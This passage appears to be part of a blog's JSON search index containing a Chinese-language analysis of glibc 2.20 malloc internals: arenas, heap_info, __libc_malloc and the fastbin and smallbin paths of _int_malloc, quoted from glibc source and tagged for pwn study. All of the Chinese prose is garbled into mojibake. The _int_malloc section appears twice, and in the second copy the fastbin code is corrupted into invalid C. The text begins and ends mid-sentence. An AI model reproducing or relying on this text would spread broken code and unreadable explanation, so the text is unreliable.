·å¯ä»¥åˆ†é…å°å†…å­˜å—ï¼Œå¹¶ä¸”å¯ä»¥åˆ›å»ºå¤šä¸ªéä¸»åˆ†é…åŒºï¼Œä»è€Œåœ¨çº¿ç¨‹åˆ†é…å†…å­˜ç«äº‰æ¯”è¾ƒæ¿€çƒˆçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ›å»ºæ›´å¤šçš„éä¸»åˆ†é…åŒºæ¥å®Œæˆåˆ†é…ä»»åŠ¡ï¼Œå‡å°‘åˆ†é…åŒºçš„é”ç«äº‰ï¼Œæé«˜åˆ†é…æ•ˆç‡ã€‚ Ptmallocæ€ä¹ˆç”¨éä¸»åˆ†é…åŒºæ¥æ¨¡æ‹Ÿä¸»åˆ†é…åŒºçš„è¡Œä¸ºå‘¢ï¼Ÿé¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„éä¸»åˆ†é…åŒºï¼Œéä¸»åˆ†é…åŒºä½¿ç”¨mmap()å‡½æ•°åˆ†é…ä¸€å¤§å—å†…å­˜æ¥æ¨¡æ‹Ÿå †ï¼ˆsub-heapï¼‰ï¼Œæ‰€æœ‰çš„ä»è¯¥éä¸»åˆ†é…åŒºæ€»åˆ†é…çš„å°å†…å­˜å—éƒ½ä»sub-heapä¸­åˆ‡åˆ†å‡ºæ¥ï¼Œå¦‚æœä¸€ä¸ªsub-heapçš„å†…å­˜ç”¨å…‰äº†ï¼Œæˆ–æ˜¯sub-heapä¸­çš„å†…å­˜ä¸å¤Ÿç”¨æ—¶ï¼Œä½¿ç”¨mmap()åˆ†é…ä¸€å—æ–°çš„å†…å­˜å—ä½œä¸ºsub-heapï¼Œå¹¶å°†æ–°çš„sub-heapé“¾æ¥åœ¨éä¸»åˆ†é…åŒºä¸­sub-heapçš„å•å‘é“¾è¡¨ä¸­ã€‚ åˆ†ä¸»åˆ†é…åŒºä¸­çš„sub-heapæ‰€å ç”¨çš„å†…å­˜ä¸ä¼šæ— é™çš„å¢é•¿ä¸‹å»ï¼ŒåŒæ ·ä¼šåƒä¸»åˆ†é…åŒºé‚£æ ·è¿›è¡Œsub-heapæ”¶ç¼©ï¼Œå°†sub-heapä¸­top chunkçš„ä¸€éƒ¨åˆ†è¿”å›ç»™æ“ä½œç³»ç»Ÿï¼Œå¦‚æœtop chunkä¸ºæ•´ä¸ªsub-heapï¼Œä¼šæŠŠæ•´ä¸ªsub-heapè¿˜å›ç»™æ“ä½œç³»ç»Ÿã€‚æ”¶ç¼©å †çš„æ¡ä»¶æ˜¯å½“å‰freeçš„chunkå¤§å°åŠ ä¸Šå‰åèƒ½åˆå¹¶chunkçš„å¤§å°å¤§äº64KBï¼Œå¹¶ä¸”top chunkçš„å¤§å°è¾¾åˆ°mmapæ”¶ç¼©é˜ˆå€¼ï¼Œæ‰æœ‰å¯èƒ½æ”¶ç¼©å †ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿›ç¨‹ä¸­æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¹Ÿæœ‰å¤šä¸ªåˆ†é…åŒºï¼Œçº¿ç¨‹çš„æ•°æ®ä¸€èˆ¬ä¼šæ¯”åˆ†é…åŒºæ•°é‡å¤šï¼Œæ‰€ä»¥å¿…èƒ½ä¿è¯æ²¡æœ‰çº¿ç¨‹ç‹¬äº«ä¸€ä¸ªåˆ†é…åŒºï¼Œæ¯ä¸ªåˆ†é…åŒºéƒ½æœ‰å¯èƒ½è¢«å¤šä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œä¸ºäº†ä¿è¯åˆ†é…åŒºçš„çº¿ç¨‹å®‰å…¨ï¼Œå¯¹åˆ†é…åŒºçš„è®¿é—®éœ€è¦é”ä¿æŠ¤ï¼Œå½“çº¿ç¨‹è·å¾—åˆ†é…åŒºçš„é”æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¯¥åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œå¹¶å°†è¯¥åˆ†é…åŒºçš„æŒ‡é’ˆä¿å­˜åœ¨çº¿ç¨‹çš„ç§æœ‰å®ä¾‹ä¸­ã€‚ å½“æŸä¸€çº¿ç¨‹éœ€è¦è°ƒç”¨mallocåˆ†é…å†…å­˜ç©ºé—´æ—¶ï¼Œè¯¥çº¿ç¨‹å…ˆæŸ¥çœ‹çº¿ç¨‹ç§æœ‰å˜é‡ä¸­æ˜¯å¦å·²ç»å­˜åœ¨ä¸€ä¸ªåˆ†é…åŒºï¼Œå¦‚æœå­˜åœ¨ï¼Œå°è¯•å¯¹è¯¥åˆ†é…åŒºåŠ é”ï¼Œå¦‚æœåŠ é”æˆåŠŸï¼Œä½¿ç”¨è¯¥åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œå¦‚æœå¤±è´¥ï¼Œè¯¥çº¿ç¨‹æœåˆ†é…åŒºç´¢å¾ªç¯é“¾è¡¨è¯•å›¾è·å¾—ä¸€ä¸ªç©ºé—²çš„åˆ†é…åŒºã€‚å¦‚æœæ‰€æœ‰çš„åˆ†é…åŒºéƒ½å·²ç»åŠ é”ï¼Œé‚£ä¹ˆmallocä¼šå¼€è¾Ÿä¸€ä¸ªæ–°çš„åˆ†é…åŒºï¼ŒæŠŠè¯¥åˆ†é…åŒºåŠ å…¥åˆ°åˆ†é…åŒºçš„å…¨å±€åˆ†é…åŒºå¾ªç¯é“¾è¡¨å¹¶åŠ é”ï¼Œç„¶åä½¿ç”¨è¯¥åˆ†é…åŒºè¿›è¡Œåˆ†é…æ“ä½œã€‚åœ¨å›æ”¶æ“ä½œä¸­ï¼Œçº¿ç¨‹åŒæ ·è¯•å›¾è·å¾—å¾…å›æ”¶å—æ‰€åœ¨åˆ†é…åŒºçš„é”ï¼Œå¦‚æœè¯¥åˆ†é…åŒºæ­£åœ¨è¢«åˆ«çš„çº¿ç¨‹ä½¿ç”¨ï¼Œåˆ™éœ€è¦ç­‰å¾…ç›´åˆ°å…¶ä»–çº¿ç¨‹é‡Šæ”¾è¯¥åˆ†é…åŒºçš„äº’æ–¥é”ä¹‹åæ‰å¯ä»¥è¿›è¡Œå›æ”¶æ“ä½œã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#å¤šåˆ†é…åŒº"},{"categories":["Pwning"],"content":"heap_info /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */typedef struct _heap_info{ mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ \u0026 MALLOC_ALIGN_MASK];} heap_info; ar_ptræ˜¯æŒ‡å‘æ‰€å±åˆ†é…åŒºçš„æŒ‡é’ˆ; prevå­—æ®µç”¨äºå°†åŒä¸€ä¸ªåˆ†é…åŒºä¸­çš„sub_heapç”¨å•å‘é“¾è¡¨é“¾æ¥èµ·æ¥ã€‚prevæŒ‡å‘é“¾è¡¨ä¸­çš„å‰ä¸€ä¸ªsub_heapã€‚ sizeå­—æ®µè¡¨ç¤ºå½“å‰sub_heapä¸­çš„å†…å­˜å¤§å°ï¼Œä»¥pageå¯¹é½ã€‚ mprotect_sizeå­—æ®µè¡¨ç¤ºå½“å‰sub_heapä¸­è¢«è¯»å†™ä¿æŠ¤çš„å†…å­˜å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æ²¡æœ‰è¢«åˆ†é…çš„å†…å­˜å¤§å°ã€‚ Padå­—æ®µç”¨äºä¿è¯sizeof (heap_info) + 2 * SIZE_SZæ˜¯æŒ‰MALLOC_ALIGNMENTå¯¹é½çš„ã€‚MALLOC_ALIGNMENT_MASKä¸º2 *SIZE_SZ - 1ï¼Œæ— è®ºSIZE_SZä¸º4æˆ–8ï¼Œ-6 * SIZE_SZ \u0026 MALLOC_ALIGN_MASKçš„å€¼ä¸º0ï¼Œå¦‚æœsizeof (heap_info)+ 2 * SIZE_SZä¸æ˜¯æŒ‰MALLOC_ALIGNMENTå¯¹é½ï¼Œç¼–è¯‘çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œç¼–è¯‘æ—¶ä¼šæ‰§è¡Œä¸‹é¢çš„å®ã€‚ /* Get a compile-time error if the heap_info padding is not correct to make alignment work as expected in sYSMALLOc. */extern int sanity_check_heap_info_alignment[(sizeof (heap_info) + 2 * SIZE_SZ) % MALLOC_ALIGNMENT ? -1 : 1]; ä¸ºä»€ä¹ˆä¸€å®šè¦ä¿è¯å¯¹é½å‘¢ï¼Ÿä½œä¸ºåˆ†ä¸»åˆ†é…åŒºçš„ç¬¬ä¸€ä¸ªsub_heapï¼Œheap_infoå­˜æ”¾åœ¨sub_heapçš„å¤´éƒ¨ï¼Œç´§è·Ÿheap_infoä¹‹åæ˜¯è¯¥éä¸»åˆ†é…åŒºçš„malloc_stateå®ä¾‹ï¼Œç´§è·Ÿmalloc_stateå®ä¾‹åï¼Œæ˜¯sub_heapä¸­çš„ç¬¬ä¸€ä¸ªchunkï¼Œä½†chunkçš„é¦–åœ°å€å¿…é¡»æŒ‰ç…§MALLOC_ALIGNMENTå¯¹é½ï¼Œæ‰€ä»¥åœ¨malloc_stateå®ä¾‹å’Œç¬¬ä¸€ä¸ªchunkä¹‹é—´å¯èƒ½æœ‰å‡ ä¸ªå­—èŠ‚çš„padï¼Œä½†å¦‚æœsub_heapä¸æ˜¯éä¸»åˆ†é…åŒºçš„ç¬¬ä¸€ä¸ªsub_heapï¼Œåˆ™ç´§è·Ÿheap_infoåæ˜¯ç¬¬ä¸€ä¸ªchunkï¼Œä½†sysmalloc()å‡½æ•°é»˜è®¤heap_infoæ˜¯æŒ‰ç…§MALLOC_ALIGNMENTå¯¹é½çš„ï¼Œæ²¡æœ‰å†åšå¯¹é½çš„å·¥ä½œï¼Œç›´æ¥å°†heap_infoåçš„å†…å­˜å¼ºåˆ¶è½¬æ¢æˆä¸€ä¸ªchunkã€‚æ‰€ä»¥è¿™é‡Œåœ¨ç¼–è¯‘æ—¶ä¿è¯sizeof (heap_info) + 2 * SIZE_SZæ˜¯æŒ‰MALLOC_ALIGNMENTå¯¹é½çš„ï¼Œåœ¨è¿è¡Œæ—¶å°±ä¸ç”¨å†åšæ£€æŸ¥äº†ï¼Œä¹Ÿä¸å¿…å†åšå¯¹é½ã€‚ /* Thread specific data */static tsd_key_t arena_key;static mutex_t list_lock = MUTEX_INITIALIZER;static size_t narenas = 1;static mstate free_list;/* Mapped memory in non-main arenas (reliable only for NO_THREADS). */static unsigned long arena_mem;/* Already initialized? */int __malloc_initialized = -1; arena_keyå­˜æ”¾çš„æ˜¯çº¿ç¨‹çš„ç§ç”¨å®ä¾‹ï¼Œè¯¥ç§æœ‰å®ä¾‹ä¿å­˜çš„æ˜¯åˆ†é…åŒºï¼ˆarenaï¼‰çš„malloc_stateå®ä¾‹çš„æŒ‡é’ˆã€‚arena_keyæŒ‡å‘çš„å¯èƒ½æ˜¯ä¸»åˆ†é…åŒºçš„æŒ‡é’ˆï¼Œä¹Ÿå¯èƒ½æ˜¯éä¸»åˆ†é…åŒºçš„æŒ‡é’ˆã€‚ list_lockç”¨äºåŒæ­¥åˆ†é…åŒºçš„å•å‘ç¯å½¢é“¾è¡¨ã€‚ å¦‚æœå®šä¹‰äº†PRE_THREADï¼Œnarenaså…¨å±€å˜é‡è¡¨ç¤ºå½“å‰åˆ†é…åŒºçš„æ•°é‡ï¼Œfree_listå…¨å±€å˜é‡æ˜¯ç©ºé—²åˆ†é…åŒºçš„å•å‘é“¾è¡¨ï¼Œè¿™äº›ç©ºé—²çš„åˆ†é…åŒºå¯èƒ½æ˜¯ä»çˆ¶è¿›ç¨‹é‚£é‡Œç»§æ‰¿æ¥çš„ã€‚å…¨å±€å˜é‡narenaså’Œfree_listéƒ½ç”¨é”list_lockåŒæ­¥ã€‚ arena_memåªç”¨äºå•çº¿ç¨‹çš„ptmallocç‰ˆæœ¬ï¼Œè®°å½•äº†éä¸»åˆ†é…åŒºæ‰€åˆ†é…çš„å†…å­˜å¤§å°ã€‚ __malloc_initializdå…¨å±€å˜é‡ç”¨æ¥æ ‡è¯†æ˜¯å¦ptmallocå·²ç»åˆå§‹åŒ–äº†ï¼Œå…¶å€¼å¤§äº0æ—¶è¡¨ç¤ºå·²ç»åˆå§‹åŒ–ã€‚ /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */#define arena_get(ptr, size) do { \\ arena_lookup (ptr); \\ arena_lock (ptr, size); \\ } while (0)#define arena_lookup(ptr) do { \\ void *vptr = NULL; \\ ptr = (mstate) tsd_getspecific (arena_key, vptr); \\ } while (0)#define arena_lock(ptr, size) do { \\ if (ptr) \\ (void) mutex_lock (\u0026ptr-\u003emutex); \\ else \\ ptr = arena_get2 (ptr, (size), NULL); \\ } while (0) ä¸Šè¿°ç”¨ä»¥è·å¾—ä¸€ä¸ªåˆ†é…åŒºã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#heap_info"},{"categories":["Pwning"],"content":"å…¬å…±åŒ…è£…","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#å…¬å…±åŒ…è£…"},{"categories":["Pwning"],"content":"__libc_malloc /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t.*/void * __libc_malloc(size_t); __libc_mallocæ˜¯mallocçš„çœŸæ­£è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œæ˜¯å…³äºå…¶åŠŸèƒ½çš„æ¦‚è¿°ã€‚ void *__libc_malloc (size_t bytes){ mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_lookup (ar_ptr); arena_lock (ar_ptr, bytes); if (!ar_ptr) return 0; victim = _int_malloc (ar_ptr, bytes); if (!victim) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); if (__builtin_expect (ar_ptr != NULL, 1)) { victim = _int_malloc (ar_ptr, bytes); (void) mutex_unlock (\u0026ar_ptr-\u003emutex); } } else (void) mutex_unlock (\u0026ar_ptr-\u003emutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;} é¦–å…ˆï¼Œæ£€æŸ¥__malloc_hookæ˜¯å¦ä¸ºç©ºï¼Œæ˜¯åˆ™å‘ä¸‹æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œ__malloc_hookæŒ‡å‘çš„å‡½æ•°ã€‚è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸ºäº†è®©ä½¿ç”¨è€…å®šä¹‰è‡ªå·±çš„mallocï¼Œå…¶ä¹Ÿå­˜åœ¨äºfreeã€reallocç­‰å‡½æ•°ä¸­ã€‚åœ¨è¿›ç¨‹åˆå§‹åŒ–æ—¶__malloc_hookæŒ‡å‘çš„å‡½æ•°ä¸ºmalloc_hook_ini()ã€‚ /* arena_get() acquires an arena and locks the corresponding mutex. First, try the one last locked successfully by this thread. (This is the common case and handled with a macro for speed.) Then, loop once over the circularly linked list of arenas. If no arena is readily available, create a new one. In this latter case, `size' is just a hint as to how much memory will be required immediately in the new arena. */#define arena_get(ptr, size) do { \\ arena_lookup (ptr); \\ arena_lock (ptr, size); \\ } while (0)#define arena_lookup(ptr) do { \\ void *vptr = NULL; \\ ptr = (mstate) tsd_getspecific (arena_key, vptr); \\ } while (0)#define arena_lock(ptr, size) do { \\ if (ptr) \\ (void) mutex_lock (\u0026ptr-\u003emutex); \\ else \\ ptr = arena_get2 (ptr, (size), NULL); \\ } while (0) è°ƒç”¨arena_lookupæŸ¥æ‰¾æœ¬çº¿ç¨‹çš„ç§ç”¨å®ä¾‹ä¸­æ˜¯å¦åŒ…å«ä¸€ä¸ªåˆ†é…åŒºçš„æŒ‡é’ˆï¼Œè¿”å›è¯¥æŒ‡é’ˆï¼Œè°ƒç”¨arena_lockå°è¯•å¯¹è¯¥åˆ†é…åŒºåŠ é”ï¼Œå¦‚æœåŠ é”æˆåŠŸï¼Œä½¿ç”¨è¯¥åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œå¦‚æœå¯¹è¯¥åˆ†é…åŒºåŠ é”å¤±è´¥ï¼Œè°ƒç”¨arena_get2è·å¾—ä¸€ä¸ªåˆ†é…åŒºæŒ‡é’ˆã€‚ ä¹‹åè°ƒç”¨äº†_int_mallocä»åˆ†é…åŒºä¸­è·å–å†…å­˜ã€‚å¦‚æœ_int_malloc()å‡½æ•°åˆ†é…å†…å­˜å¤±è´¥ï¼Œå¹¶ä¸”ä½¿ç”¨çš„åˆ†é…åŒºä¸æ˜¯ä¸»åˆ†é…åŒºï¼Œè¿™ç§æƒ…å†µå¯èƒ½æ˜¯mmapåŒºåŸŸçš„å†…å­˜è¢«ç”¨å…‰äº†ï¼Œå½“ä¸»åˆ†é…åŒºå¯ä»¥ä»å †ä¸­åˆ†é…å†…å­˜ï¼Œæ‰€ä»¥éœ€è¦å†å°è¯•ä»ä¸»åˆ†é…åŒºä¸­åˆ†é…å†…å­˜ã€‚é¦–å…ˆé‡Šæ”¾æ‰€ä½¿ç”¨åˆ†é…åŒºçš„é”ï¼Œç„¶åè·å¾—ä¸»åˆ†é…åŒºçš„é”ï¼Œå¹¶è°ƒç”¨_int_malloc()å‡½æ•°åˆ†é…å†…å­˜ï¼Œæœ€åé‡Šæ”¾ä¸»åˆ†é…åŒºçš„é”ã€‚ /* If we don't have the main arena, then maybe the failure is due to running out of mmapped areas, so we can try allocating on the main arena. Otherwise, it is likely that sbrk() has failed and there is still a chance to mmap(), so try one of the other arenas. */static mstatearena_get_retry (mstate ar_ptr, size_t bytes){ LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != \u0026main_arena) { (void) mutex_unlock (\u0026ar_ptr-\u003emutex); ar_ptr = \u0026main_arena; (void) mutex_lock (\u0026ar_ptr-\u003emutex); } else { /* Grab ar_ptr-\u003enext prior to releasing its lock. */ mstate prev = ar_ptr-\u003enext ? ar_ptr : 0; (void) mutex_unlock (\u0026ar_ptr-\u003emutex); ar_ptr = arena_get2 (prev, bytes, ar_ptr); } return ar_ptr;} å¦‚æœ_int_malloc()å‡½æ•°åˆ†é…å†…å­˜å¤±è´¥ï¼Œå¹¶ä¸”ä½¿ç”¨çš„åˆ†é…åŒºæ˜¯ä¸»åˆ†é…åŒºï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰éä¸»åˆ†é…åŒºï¼Œå¦‚æœæœ‰ï¼Œè°ƒç”¨arena_get2()è·å–åˆ†é…åŒºï¼Œç„¶åå¯¹ä¸»åˆ†é…åŒºè§£é”ï¼Œå¦‚æœarena_get2()è¿”å›ä¸€ä¸ªéä¸»åˆ†é…åŒºï¼Œå°è¯•è°ƒç”¨_int_malloc()å‡½æ•°ä»è¯¥éä¸»åˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œæœ€åé‡Šæ”¾è¯¥éä¸»åˆ†é…åŒºçš„é”ã€‚ å¦‚æœ_int_malloc()å‡½æ•°åˆ†é…å†…å­˜æˆåŠŸï¼Œé‡Šæ”¾æ‰€ä½¿ç”¨çš„åˆ†é…åŒºçš„é”ã€‚ å¯ä»¥å‘ç°çœŸæ­£åˆ†é…å†…å­˜çš„å‡½æ•°æ˜¯_int_malloc()ï¼Œè€Œ__libc_malloc()åªæ˜¯å…¶ç®€å•çš„å°è£…ã€‚ ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#__libc_malloc"},{"categories":["Pwning"],"content":"_int_malloc()ä¸‹é¢é‡ç‚¹åˆ†æ_int_malloc()ï¼š /* ------------------------------ malloc ------------------------------ */static void *_int_malloc (mstate av, size_t bytes){ INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; è¿™é‡Œæ˜¯å®šä¹‰çš„ä¸€äº›å˜é‡ /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); checked_request2size()å°†è¯·æ±‚çš„å¤§å°è½¬åŒ–ä¸ºchunkçš„å¤§å°ï¼Œåœ¨_int_malloc()å†…éƒ¨åˆ†é…å†…å­˜æ˜¯ä»¥chunkä¸ºå•ä½çš„ã€‚ /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) \u003c= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); mfastbinptr *fb = \u0026fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-\u003efd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } å¦‚æœchunkçš„å¤§å°åœ¨fast binsçš„èŒƒå›´å†…ï¼Œé¦–å…ˆå°è¯•åœ¨fast binsä¸­å¯»æ‰¾é€‚åˆçš„chunkã€‚ é¦–å…ˆæ ¹æ®æ‰€éœ€chunkçš„å¤§å°è·å¾—è¯¥chunkæ‰€å±fast binçš„indexï¼Œæ ¹æ®è¯¥indexè·å¾—æ‰€éœ€fast binçš„ç©ºé—²chunké“¾è¡¨çš„å¤´æŒ‡é’ˆï¼Œç„¶åå°†å¤´æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªchunkä½œä¸ºç©ºé—²chunké“¾è¡¨çš„å¤´éƒ¨ã€‚ä¸ºäº†åŠ å¿«ä»fast binsä¸­åˆ†é…chunkï¼Œå¤„äºfast binsä¸­chunkçš„çŠ¶æ€ä»ç„¶ä¿æŒä¸ºinuseçŠ¶æ€ï¼Œé¿å…è¢«ç›¸é‚»çš„ç©ºé—²chunkåˆå¹¶ï¼Œä»fast binsä¸­åˆ†é…chunkï¼Œåªéœ€å–å‡ºç¬¬ä¸€ä¸ªchunkï¼Œå¹¶è°ƒç”¨chunk2mem()å‡½æ•°è¿”å›ç”¨æˆ·æ‰€éœ€çš„å†…å­˜å—ã€‚ /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { if (victim == 0) /* initialization check */ malloc_consolidate (av); else { bck = victim-\u003ebk; if (__glibc_unlikely (bck-\u003efd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-\u003ebk = bck; bck-\u003efd = bin; if (av != \u0026main_arena) victim-\u003esize |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } å¦‚æœåˆ†é…çš„chunkå±äºsmall binï¼Œé¦–å…ˆæŸ¥æ‰¾chunkæ‰€å¯¹åº”small binsæ•°ç»„çš„indexï¼Œç„¶åæ ¹æ®indexè·å¾—æŸä¸ªsmall binçš„ç©ºé—²chunkåŒå‘å¾ªç¯é“¾è¡¨è¡¨å¤´ï¼Œç„¶åå°†æœ€åä¸€ä¸ªchunkèµ‹å€¼ç»™victimï¼Œå¦‚æœvictimä¸è¡¨å¤´ç›¸åŒï¼Œè¡¨ç¤ºè¯¥é“¾è¡¨ä¸ºç©ºï¼Œä¸èƒ½ä»small binçš„ç©ºé—²chunké“¾è¡¨ä¸­åˆ†é…ã€‚è‹¥victimä¸º0ï¼Œè¡¨ç¤ºsmall binå¹¶æ²¡æœ‰åˆå§‹åŒ–ã€‚æ‰€ä»¥è°ƒç”¨malloc_consolidateå°†è¯¥åˆ†é…åŒºfast binsä¸­chunkè¿›è¡Œåˆå¹¶ã€‚å¦åˆ™å¯¹è¯¥binä¸­æœ€åä¸€ä¸ªchunkè¿›è¡ŒåŒå‘é“¾è¡¨æ£€æŸ¥ï¼Œæ£€æŸ¥ä¸Šä¸€ä¸ªchunkçš„åä¸€ä¸ªæ˜¯å¦æ˜¯victimã€‚æ­£ç¡®ä¹‹åï¼Œè®¾ç½®å…¶æ§åˆ¶ä½ã€‚æœ€åå°†æŒ‡é’ˆè½¬åŒ–ä½memè¿”å›ç»™ç”¨æˆ·ã€‚ å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰é“¾è¡¨ä¸ºç©ºæ—¶çš„ç›¸åº”å¤„ç†ï¼Œè¿™ç§æƒ…å†µä¼šåœ¨ä¹‹åè¿›è¡Œå¤„ç†ã€‚ /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in o","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Mallocæºç åˆ†æ","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_int_malloc"},{"categories":["Pwning"],"content":"_int_malloc()ä¸‹é¢é‡ç‚¹åˆ†æ_int_malloc()ï¼š /* ------------------------------ malloc ------------------------------ */static void *_int_malloc (mstate av, size_t bytes){ INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; è¿™é‡Œæ˜¯å®šä¹‰çš„ä¸€äº›å˜é‡ /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); checked_request2size()å°†è¯·æ±‚çš„å¤§å°è½¬åŒ–ä¸ºchunkçš„å¤§å°ï¼Œåœ¨_int_malloc()å†…éƒ¨åˆ†é…å†…å­˜æ˜¯ä»¥chunkä¸ºå•ä½çš„ã€‚ /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) fd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } å¦‚æœchunkçš„å¤§å°åœ¨fast 